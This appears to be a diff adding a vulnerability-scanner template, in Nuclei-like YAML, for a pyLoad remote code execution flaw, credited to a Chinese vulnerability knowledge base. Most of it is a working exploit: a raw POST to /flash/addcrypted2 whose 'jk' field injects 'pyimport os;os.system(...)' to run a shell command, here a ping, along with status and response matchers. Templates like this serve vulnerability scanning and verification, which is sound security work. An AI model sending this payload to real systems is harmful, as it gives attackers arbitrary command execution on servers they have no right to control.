@@ -1,0 +1,51 @@
+id: poc-bt9i6biat9bhzzic
+info:
+  name: pyLoad 远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bt9i6biat9bhzzic'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bt9i6biat9bhzzic
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /flash/addcrypted2 HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    jk=pyimport%20os;os.system("ping%20www.baidu.com");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    ^(?=.*?Could)(?=.*?key).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
